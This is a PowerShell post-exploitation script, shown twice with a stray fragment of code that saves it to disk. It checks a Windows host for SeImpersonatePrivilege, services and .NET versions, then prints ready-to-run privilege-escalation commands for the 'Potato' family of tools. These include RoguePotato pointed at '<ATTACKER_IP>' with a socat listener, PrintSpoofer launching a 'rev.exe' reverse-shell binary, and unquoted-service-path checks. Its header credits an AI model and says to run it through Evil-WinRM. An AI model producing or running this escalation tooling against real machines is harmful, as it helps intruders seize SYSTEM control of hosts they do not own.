Write-Host "=== Ultimate Potato Checker (Improved) ===" -ForegroundColor Cyan -BackgroundColor DarkBlue
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "Timestamp     : $timestamp" -ForegroundColor Gray

# =============================================
# Section 1 - Gather System Info
# =============================================

$build      = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$osName     = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
$arch       = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$priv       = whoami /priv
$isSeImp    = ($priv | Select-String "SeImpersonatePrivilege" | Select-String "Enabled") -ne $null

# Write Access Check
$canWrite = $true
try {
    $tmpFile = ".\__writetest_$([System.IO.Path]::GetRandomFileName()).tmp"
    [io.file]::OpenWrite($tmpFile).close()
    Remove-Item $tmpFile -ErrorAction SilentlyContinue
} catch {
    $canWrite = $false
}

# .NET Versions
$net2  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
$net35 = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"
$net4  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# Services
$spooler  = (Get-Service spooler  -ErrorAction SilentlyContinue).Status
$ikeext   = (Get-Service IKEEXT   -ErrorAction SilentlyContinue).Status
$winrm    = (Get-Service WinRM    -ErrorAction SilentlyContinue).Status
$bits     = (Get-Service BITS     -ErrorAction SilentlyContinue).Status
$wuauserv = (Get-Service wuauserv -ErrorAction SilentlyContinue).Status

# =============================================
# Section 2 - Display System Info
# =============================================

Write-Host "`n[i] System Information:" -ForegroundColor Yellow
Write-Host "OS Name       : $osName"
Write-Host "Build Number  : $build"
Write-Host "Architecture  : $arch"
Write-Host "Write Access  : $(if($canWrite){'[+] Yes'}else{'[-] No - Drop tools elsewhere!'})" -ForegroundColor $(if($canWrite){"Green"}else{"Red"})
Write-Host "SeImpersonate : $(if($isSeImp){'[+] Enabled'}else{'[-] Disabled'})" -ForegroundColor $(if($isSeImp){"Green"}else{"Red"})

Write-Host "`n[i] .NET Versions:" -ForegroundColor Yellow
Write-Host ".NET 2.0 : $(if($net2) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net2) {"Green"}else{"Red"})
Write-Host ".NET 3.5 : $(if($net35){'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net35){"Green"}else{"Red"})
Write-Host ".NET 4.x : $(if($net4) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net4) {"Green"}else{"Red"})

Write-Host "`n[i] Services Status:" -ForegroundColor Yellow
Write-Host "Print Spooler  : $(if($spooler  -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($spooler  -eq "Running"){"Green"}else{"Red"})
Write-Host "IKEEXT         : $(if($ikeext   -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($ikeext   -eq "Running"){"Green"}else{"Red"})
Write-Host "WinRM          : $(if($winrm    -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($winrm    -eq "Running"){"Green"}else{"Red"})
Write-Host "BITS           : $(if($bits     -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($bits     -eq "Running"){"Green"}else{"Red"})
Write-Host "Windows Update : $(if($wuauserv -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($wuauserv -eq "Running"){"Green"}else{"Red"})

# =============================================
# Section 3 - Tool Analysis
# =============================================

Write-Host "`n=== Tool Analysis ===" -ForegroundColor Cyan

if (-not $isSeImp) {
    Write-Host "`n[-] SeImpersonatePrivilege NOT enabled - No Potato will work!" -ForegroundColor Red
    Write-Host "    Alternatives to try:" -ForegroundColor Gray
    Write-Host "      - AlwaysInstallElevated  : reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated" -ForegroundColor Gray
    Write-Host "      - Unquoted Service Path  : wmic service get name,pathname | findstr /i /v `"c:\windows`" | findstr /i /v `"`"`"" -ForegroundColor Gray
    Write-Host "      - Weak Service Perms     : .\accesschk.exe -uwcqv `"Authenticated Users`" *" -ForegroundColor Gray
    exit
}

# --------------------------
# Hot Potato
# --------------------------
Write-Host "`n[Hot Potato]" -ForegroundColor White
if ($build -lt 14393) {
    Write-Host "  [+] WORKS - Build $build < 14393 (pre MS16-075)" -ForegroundColor Green
    Write-Host "  CMD: .\Potato.exe -ip <ATTACKER_IP> -cmd <cmd> -disable_exhaust true"
} else {
    Write-Host "  [-] REJECTED - Build $build patched (MS16-075)" -ForegroundColor Red
}

# --------------------------
# Rotten Potato
# --------------------------
Write-Host "`n[Rotten Potato]" -ForegroundColor White
if ($build -lt 17763) {
    Write-Host "  [+] WORKS - Build $build < 17763" -ForegroundColor Green
    Write-Host "  CMD: .\MSFRottenPotato.exe t c:\windows\temp\test.bat"
} else {
    Write-Host "  [-] REJECTED - Build $build too new (patched after 17763)" -ForegroundColor Red
}

# --------------------------
# Lonely Potato
# --------------------------
Write-Host "`n[Lonely Potato]" -ForegroundColor White
Write-Host "  [-] REJECTED - Deprecated, use JuicyPotato instead" -ForegroundColor Red

# --------------------------
# Juicy Potato (Old)
# --------------------------
Write-Host "`n[Juicy Potato]" -ForegroundColor White
if ($build -lt 17763) {
    Write-Host "  [+] WORKS - Build $build < 17763" -ForegroundColor Green
    Write-Host "  NOTE: Requires valid CLSID - https://github.com/ohpe/juicy-potato/tree/master/CLSID" -ForegroundColor Gray
    Write-Host "  CMD: .\juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"
} else {
    Write-Host "  [-] REJECTED - Build $build patched (use JuicyPotatoNG instead)" -ForegroundColor Red
}

# --------------------------
# JuicyPotatoNG
# --------------------------
Write-Host "`n[JuicyPotatoNG]" -ForegroundColor White
if ($build -ge 17763) {
    Write-Host "  [+] WORKS - Build $build >= 17763" -ForegroundColor Green
    if ($arch -eq "x64") {
        Write-Host "  CMD: .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe"
    } else {
        Write-Host "  NOTE: Grab x86 build - current arch is $arch" -ForegroundColor Yellow
        Write-Host "  CMD: .\JuicyPotatoNG_x86.exe -t * -p c:\windows\system32\cmd.exe"
    }
} else {
    Write-Host "  [-] REJECTED - Build $build too old, use classic JuicyPotato" -ForegroundColor Red
}

# --------------------------
# Rogue Potato
# --------------------------
Write-Host "`n[Rogue Potato]" -ForegroundColor White
if ($build -ge 17763) {
    Write-Host "  [+] WORKS - Build $build >= 17763" -ForegroundColor Green
    Write-Host "  NOTE: Requires outbound access + socat listener on attacker machine" -ForegroundColor Yellow
    Write-Host "  ATTACKER : socat tcp-listen:9999,reuseaddr,fork tcp:127.0.0.1:9999"
    Write-Host "  CMD      : .\RoguePotato.exe -r <ATTACKER_IP> -e cmd.exe -l 9999"
} else {
    Write-Host "  [-] REJECTED - Build $build not supported" -ForegroundColor Red
}

# --------------------------
# Sweet Potato
# --------------------------
Write-Host "`n[Sweet Potato]" -ForegroundColor White
Write-Host "  [+] WORKS (base) - SeImpersonate is Enabled" -ForegroundColor Green

if ($spooler -eq "Running") {
    Write-Host "  [+] Vector PrintSpoofer : Spooler is running" -ForegroundColor Green
    Write-Host "      CMD: .\SweetPotato.exe -p cmd.exe -e PrintSpoofer"
} else {
    Write-Host "  [-] Vector PrintSpoofer : Spooler stopped - skip this vector" -ForegroundColor Red
}

Write-Host "  [+] Vector DCOM         : Generally available (build-independent)" -ForegroundColor Green
Write-Host "      CMD: .\SweetPotato.exe -p cmd.exe -e DCOM"

if ($winrm -eq "Running") {
    Write-Host "  [+] Vector WinRM        : WinRM is running" -ForegroundColor Green
    Write-Host "      CMD: .\SweetPotato.exe -p cmd.exe -e WinRM"
} else {
    Write-Host "  [-] Vector WinRM        : WinRM stopped - skip this vector" -ForegroundColor Red
}

# --------------------------
# PrintSpoofer
# --------------------------
Write-Host "`n[PrintSpoofer]" -ForegroundColor White
if ($spooler -eq "Running") {
    Write-Host "  [+] WORKS - SeImpersonate Enabled + Spooler Running" -ForegroundColor Green
    Write-Host "  CMD: .\PrintSpoofer.exe -i -c cmd"
    Write-Host "  CMD: .\PrintSpoofer.exe -c `"c:\windows\temp\rev.exe`""
} else {
    Write-Host "  [-] REJECTED - Print Spooler is Stopped" -ForegroundColor Red
}

# --------------------------
# Generic Potato
# --------------------------
Write-Host "`n[Generic Potato]" -ForegroundColor White
if ($spooler -eq "Running") {
    Write-Host "  [+] WORKS via PrintSpoofer vector - Spooler is Running" -ForegroundColor Green
    Write-Host "  CMD: .\GenericPotato.exe -e PrintSpoofer -p cmd.exe"
} elseif ($winrm -eq "Running") {
    Write-Host "  [+] WORKS via NamedPipe - WinRM is Running" -ForegroundColor Green
    Write-Host "  CMD: .\GenericPotato.exe -e NamedPipe -p cmd.exe"
} else {
    Write-Host "  [~] POSSIBLE via HTTP - Requires SSRF to trigger coerce" -ForegroundColor Yellow
    Write-Host "  CMD: .\GenericPotato.exe -e HTTP -p cmd.exe -l 8888"
}

# --------------------------
# EfsPotato
# --------------------------
Write-Host "`n[EfsPotato]" -ForegroundColor White
Write-Host "  [~] AVAILABLE - Good fallback (uses EFS coerce, no Spooler needed)" -ForegroundColor Yellow
Write-Host "  CMD: .\EfsPotato.exe `"cmd.exe /c whoami`""

# --------------------------
# God Potato
# --------------------------
Write-Host "`n[GodPotato]" -ForegroundColor White
if ($build -ge 9200) {
    if ($net4) {
        Write-Host "  [+] WORKS (NET4) - SeImpersonate + .NET 4.x + Build $build >= 9200" -ForegroundColor Green
        Write-Host "  CMD: .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`""
    } elseif ($net35) {
        Write-Host "  [+] WORKS (NET3.5) - SeImpersonate + .NET 3.5 available" -ForegroundColor Green
        Write-Host "  CMD: .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`""
    } elseif ($net2) {
        Write-Host "  [~] WORKS (NET2) - Only .NET 2.0 available" -ForegroundColor Yellow
        Write-Host "  CMD: .\GodPotato-NET2.exe -cmd `"cmd /c whoami /all`""
    } else {
        Write-Host "  [-] REJECTED - No .NET version detected" -ForegroundColor Red
    }
} else {
    Write-Host "  [-] REJECTED - Build $build too old (< 9200)" -ForegroundColor Red
}

# =============================================
# Section 4 - Final Recommendation
# =============================================

Write-Host "`n=== Final Recommendation ===" -ForegroundColor Cyan

$rank = 1

if ($build -ge 9200 -and $net4) {
    Write-Host "[$rank] GodPotato-NET4  : .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor Green
    $rank++
} elseif ($build -ge 9200 -and $net35) {
    Write-Host "[$rank] GodPotato-NET35 : .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor Green
    $rank++
}

if ($spooler -eq "Running") {
    Write-Host "[$rank] PrintSpoofer    : .\PrintSpoofer.exe -i -c cmd" -ForegroundColor Green
    $rank++
}

Write-Host "[$rank] Sweet Potato    : .\SweetPotato.exe -p cmd.exe -e DCOM" -ForegroundColor Yellow
$rank++

if ($build -ge 17763) {
    Write-Host "[$rank] JuicyPotatoNG   : .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe" -ForegroundColor Yellow
    $rank++
}

Write-Host "[$rank] EfsPotato       : .\EfsPotato.exe `"cmd.exe /c whoami`"" -ForegroundColor Gray

# =============================================
# Section 5 - Export Report
# =============================================

$reportPath = ".\PotatoReport_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$report = @"
=== Ultimate Potato Checker Report ===
Timestamp    : $timestamp
OS           : $osName
Build        : $build
Architecture : $arch
SeImpersonate: $(if($isSeImp){"Enabled"}else{"Disabled"})
Write Access : $(if($canWrite){"Yes"}else{"No"})

.NET 2.0 : $(if($net2){"Found"}else{"Not Found"})
.NET 3.5 : $(if($net35){"Found"}else{"Not Found"})
.NET 4.x : $(if($net4){"Found"}else{"Not Found"})

Print Spooler  : $spooler
IKEEXT         : $ikeext
WinRM          : $winrm
BITS           : $bits
Windows Update : $wuauserv
"@

try {
    $report | Out-File -FilePath $reportPath -Encoding UTF8
    Write-Host "`n[+] Report saved to: $reportPath" -ForegroundColor Cyan
} catch {
    Write-Host "`n[!] Could not save report (no write access or permission denied)" -ForegroundColor Yellow
}

Write-Host "`n[Done] Good luck! o7`n" -ForegroundColor Cyan
'@

$script | Out-File -FilePath ".\UltimatePotato_Improved.ps1" -Encoding UTF8
Write-Host "Saved! Run: .\UltimatePotato_Improved.ps1" -ForegroundColor Green
```






```UltimatePotato_Improved.ps1
# ============================================================
#   Ultimate Potato Checker - Improved Version
#   Author  : Improved by Claude
#   Purpose : Detect viable Potato privilege escalation paths
#   Usage   : Run from memory or disk in Evil-WinRM / PS shell
# ============================================================

Write-Host "=== Ultimate Potato Checker (Improved) ===" -ForegroundColor Cyan -BackgroundColor DarkBlue
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "Timestamp     : $timestamp" -ForegroundColor Gray

# =============================================
# Section 1 - Gather System Info
# =============================================

$build      = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$osName     = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
$arch       = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$priv       = whoami /priv
$isSeImp    = ($priv | Select-String "SeImpersonatePrivilege" | Select-String "Enabled") -ne $null

# Write Access Check
$canWrite = $true
try {
    $tmpFile = ".\__writetest_$([System.IO.Path]::GetRandomFileName()).tmp"
    [io.file]::OpenWrite($tmpFile).close()
    Remove-Item $tmpFile -ErrorAction SilentlyContinue
} catch {
    $canWrite = $false
}

# .NET Versions
$net2  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
$net35 = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"
$net4  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# Services
$spooler  = (Get-Service spooler  -ErrorAction SilentlyContinue).Status
$ikeext   = (Get-Service IKEEXT   -ErrorAction SilentlyContinue).Status
$winrm    = (Get-Service WinRM    -ErrorAction SilentlyContinue).Status
$bits     = (Get-Service BITS     -ErrorAction SilentlyContinue).Status
$wuauserv = (Get-Service wuauserv -ErrorAction SilentlyContinue).Status

# =============================================
# Section 2 - Display System Info
# =============================================

Write-Host "`n[i] System Information:" -ForegroundColor Yellow
Write-Host "OS Name       : $osName"
Write-Host "Build Number  : $build"
Write-Host "Architecture  : $arch"
Write-Host "Write Access  : $(if($canWrite){'[+] Yes'}else{'[-] No - Drop tools elsewhere!'})" -ForegroundColor $(if($canWrite){"Green"}else{"Red"})
Write-Host "SeImpersonate : $(if($isSeImp){'[+] Enabled'}else{'[-] Disabled'})" -ForegroundColor $(if($isSeImp){"Green"}else{"Red"})

Write-Host "`n[i] .NET Versions:" -ForegroundColor Yellow
Write-Host ".NET 2.0 : $(if($net2) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net2) {"Green"}else{"Red"})
Write-Host ".NET 3.5 : $(if($net35){'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net35){"Green"}else{"Red"})
Write-Host ".NET 4.x : $(if($net4) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net4) {"Green"}else{"Red"})

Write-Host "`n[i] Services Status:" -ForegroundColor Yellow
Write-Host "Print Spooler  : $(if($spooler  -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($spooler  -eq "Running"){"Green"}else{"Red"})
Write-Host "IKEEXT         : $(if($ikeext   -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($ikeext   -eq "Running"){"Green"}else{"Red"})
Write-Host "WinRM          : $(if($winrm    -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($winrm    -eq "Running"){"Green"}else{"Red"})
Write-Host "BITS           : $(if($bits     -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($bits     -eq "Running"){"Green"}else{"Red"})
Write-Host "Windows Update : $(if($wuauserv -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($wuauserv -eq "Running"){"Green"}else{"Red"})

# =============================================
# Section 3 - Tool Analysis
# =============================================

Write-Host "`n=== Tool Analysis ===" -ForegroundColor Cyan

if (-not $isSeImp) {
    Write-Host "`n[-] SeImpersonatePrivilege NOT enabled - No Potato will work!" -ForegroundColor Red
    Write-Host "    Alternatives to try:" -ForegroundColor Gray
    Write-Host "      - AlwaysInstallElevated  : reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated" -ForegroundColor Gray
    Write-Host "      - Unquoted Service Path  : wmic service get name,pathname | findstr /i /v `"c:\windows`" | findstr /i /v `"`"`"" -ForegroundColor Gray
    Write-Host "      - Weak Service Perms     : .\accesschk.exe -uwcqv `"Authenticated Users`" *" -ForegroundColor Gray
    exit
}

# --------------------------
# Hot Potato
# --------------------------
Write-Host "`n[Hot Potato]" -ForegroundColor White
if ($build -lt 14393) {
    Write-Host "  [+] WORKS - Build $build < 14393 (pre MS16-075)" -ForegroundColor Green
    Write-Host "  CMD: .\Potato.exe -ip <ATTACKER_IP> -cmd <cmd> -disable_exhaust true"
} else {
    Write-Host "  [-] REJECTED - Build $build patched (MS16-075)" -ForegroundColor Red
}

# --------------------------
# Rotten Potato
# --------------------------
Write-Host "`n[Rotten Potato]" -ForegroundColor White
if ($build -lt 17763) {
    Write-Host "  [+] WORKS - Build $build < 17763" -ForegroundColor Green
    Write-Host "  CMD: .\MSFRottenPotato.exe t c:\windows\temp\test.bat"
} else {
    Write-Host "  [-] REJECTED - Build $build too new (patched after 17763)" -ForegroundColor Red
}

# --------------------------
# Lonely Potato
# --------------------------
Write-Host "`n[Lonely Potato]" -ForegroundColor White
Write-Host "  [-] REJECTED - Deprecated, use JuicyPotato instead" -ForegroundColor Red

# --------------------------
# Juicy Potato (Old)
# --------------------------
Write-Host "`n[Juicy Potato]" -ForegroundColor White
if ($build -lt 17763) {
    Write-Host "  [+] WORKS - Build $build < 17763" -ForegroundColor Green
    Write-Host "  NOTE: Requires valid CLSID for this OS - check https://github.com/ohpe/juicy-potato/tree/master/CLSID" -ForegroundColor Gray
    Write-Host "  CMD: .\juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"
} else {
    Write-Host "  [-] REJECTED - Build $build patched (use JuicyPotatoNG instead)" -ForegroundColor Red
}

# --------------------------
# JuicyPotatoNG
# --------------------------
Write-Host "`n[JuicyPotatoNG]" -ForegroundColor White
if ($build -ge 17763) {
    Write-Host "  [+] WORKS - Build $build >= 17763" -ForegroundColor Green
    if ($arch -eq "x64") {
        Write-Host "  CMD: .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe"
    } else {
        Write-Host "  NOTE: Grab x86 build - current arch is $arch" -ForegroundColor Yellow
        Write-Host "  CMD: .\JuicyPotatoNG_x86.exe -t * -p c:\windows\system32\cmd.exe"
    }
} else {
    Write-Host "  [-] REJECTED - Build $build too old, use classic JuicyPotato" -ForegroundColor Red
}

# --------------------------
# Rogue Potato
# --------------------------
Write-Host "`n[Rogue Potato]" -ForegroundColor White
if ($build -ge 17763) {
    Write-Host "  [+] WORKS - Build $build >= 17763" -ForegroundColor Green
    Write-Host "  NOTE: Requires outbound network access + listener (socat/nc) on attacker machine" -ForegroundColor Yellow
    Write-Host "  ATTACKER : socat tcp-listen:9999,reuseaddr,fork tcp:127.0.0.1:9999"
    Write-Host "  CMD      : .\RoguePotato.exe -r <ATTACKER_IP> -e cmd.exe -l 9999"
} else {
    Write-Host "  [-] REJECTED - Build $build not supported" -ForegroundColor Red
}

# --------------------------
# Sweet Potato
# --------------------------
Write-Host "`n[Sweet Potato]" -ForegroundColor White
Write-Host "  [+] WORKS (base) - SeImpersonate is Enabled" -ForegroundColor Green

# Check each vector individually
if ($spooler -eq "Running") {
    Write-Host "  [+] Vector PrintSpoofer : Spooler is running" -ForegroundColor Green
    Write-Host "      CMD: .\SweetPotato.exe -p cmd.exe -e PrintSpoofer"
} else {
    Write-Host "  [-] Vector PrintSpoofer : Spooler is stopped - skip this vector" -ForegroundColor Red
}

Write-Host "  [+] Vector DCOM         : Generally available (build-independent)" -ForegroundColor Green
Write-Host "      CMD: .\SweetPotato.exe -p cmd.exe -e DCOM"

if ($winrm -eq "Running") {
    Write-Host "  [+] Vector WinRM        : WinRM is running" -ForegroundColor Green
    Write-Host "      CMD: .\SweetPotato.exe -p cmd.exe -e WinRM"
} else {
    Write-Host "  [-] Vector WinRM        : WinRM is stopped - skip this vector" -ForegroundColor Red
}

# --------------------------
# PrintSpoofer
# --------------------------
Write-Host "`n[PrintSpoofer]" -ForegroundColor White
if ($spooler -eq "Running") {
    Write-Host "  [+] WORKS - SeImpersonate Enabled + Spooler Running" -ForegroundColor Green
    Write-Host "  CMD: .\PrintSpoofer.exe -i -c cmd"
    Write-Host "  CMD: .\PrintSpoofer.exe -c `"c:\windows\temp\rev.exe`""
} else {
    Write-Host "  [-] REJECTED - Print Spooler is Stopped" -ForegroundColor Red
}

# --------------------------
# Generic Potato
# --------------------------
Write-Host "`n[Generic Potato]" -ForegroundColor White
if ($spooler -eq "Running") {
    Write-Host "  [+] WORKS via PrintSpoofer vector - Spooler is Running" -ForegroundColor Green
    Write-Host "  CMD: .\GenericPotato.exe -e PrintSpoofer -p cmd.exe"
} elseif ($winrm -eq "Running") {
    Write-Host "  [+] WORKS via NamedPipe - WinRM is Running" -ForegroundColor Green
    Write-Host "  CMD: .\GenericPotato.exe -e NamedPipe -p cmd.exe"
} else {
    Write-Host "  [~] POSSIBLE via HTTP - Requires SSRF to trigger coerce" -ForegroundColor Yellow
    Write-Host "  CMD: .\GenericPotato.exe -e HTTP -p cmd.exe -l 8888"
}

# --------------------------
# EfsPotato
# --------------------------
Write-Host "`n[EfsPotato]" -ForegroundColor White
Write-Host "  [~] AVAILABLE - Good fallback (uses EFS coerce, no Spooler needed)" -ForegroundColor Yellow
Write-Host "  CMD: .\EfsPotato.exe `"cmd.exe /c whoami`""

# --------------------------
# God Potato
# --------------------------
Write-Host "`n[GodPotato]" -ForegroundColor White
if ($build -ge 9200) {
    if ($net4) {
        Write-Host "  [+] WORKS (NET4) - SeImpersonate + .NET 4.x + Build $build >= 9200" -ForegroundColor Green
        Write-Host "  CMD: .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`""
    } elseif ($net35) {
        Write-Host "  [+] WORKS (NET3.5) - SeImpersonate + .NET 3.5 available" -ForegroundColor Green
        Write-Host "  CMD: .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`""
    } elseif ($net2) {
        Write-Host "  [~] WORKS (NET2) - Only .NET 2.0 available" -ForegroundColor Yellow
        Write-Host "  CMD: .\GodPotato-NET2.exe -cmd `"cmd /c whoami /all`""
    } else {
        Write-Host "  [-] REJECTED - No .NET version detected" -ForegroundColor Red
    }
} else {
    Write-Host "  [-] REJECTED - Build $build too old (< 9200)" -ForegroundColor Red
}

# =============================================
# Section 4 - Final Recommendation
# =============================================

Write-Host "`n=== Final Recommendation ===" -ForegroundColor Cyan

$rank = 1

if ($build -ge 9200 -and $net4) {
    Write-Host "[$rank] GodPotato-NET4  : .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor Green
    $rank++
} elseif ($build -ge 9200 -and $net35) {
    Write-Host "[$rank] GodPotato-NET35 : .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor Green
    $rank++
}

if ($spooler -eq "Running") {
    Write-Host "[$rank] PrintSpoofer    : .\PrintSpoofer.exe -i -c cmd" -ForegroundColor Green
    $rank++
}

Write-Host "[$rank] Sweet Potato    : .\SweetPotato.exe -p cmd.exe -e DCOM" -ForegroundColor Yellow
$rank++

if ($build -ge 17763) {
    Write-Host "[$rank] JuicyPotatoNG   : .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe" -ForegroundColor Yellow
    $rank++
}

Write-Host "[$rank] EfsPotato       : .\EfsPotato.exe `"cmd.exe /c whoami`"" -ForegroundColor Gray

# =============================================
# Section 5 - Export Report
# =============================================

$reportPath = ".\PotatoReport_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$report = @"
=== Ultimate Potato Checker Report ===
Timestamp    : $timestamp
OS           : $osName
Build        : $build
Architecture : $arch
SeImpersonate: $(if($isSeImp){'Enabled'}else{'Disabled'})
Write Access : $(if($canWrite){'Yes'}else{'No'})

.NET 2.0 : $(if($net2){'Found'}else{'Not Found'})
.NET 3.5 : $(if($net35){'Found'}else{'Not Found'})
.NET 4.x : $(if($net4){'Found'}else{'Not Found'})

Print Spooler  : $spooler
IKEEXT         : $ikeext
WinRM          : $winrm
BITS           : $bits
Windows Update : $wuauserv
"@

try {
    $report | Out-File -FilePath $reportPath -Encoding UTF8
    Write-Host "`n[+] Report saved to: $reportPath" -ForegroundColor Cyan
} catch {
    Write-Host "`n[!] Could not save report (no write access or permission denied)" -ForegroundColor Yellow
}

Write-Host "`n[Done] Good luck! o7`n" -ForegroundColor Cyan
```

























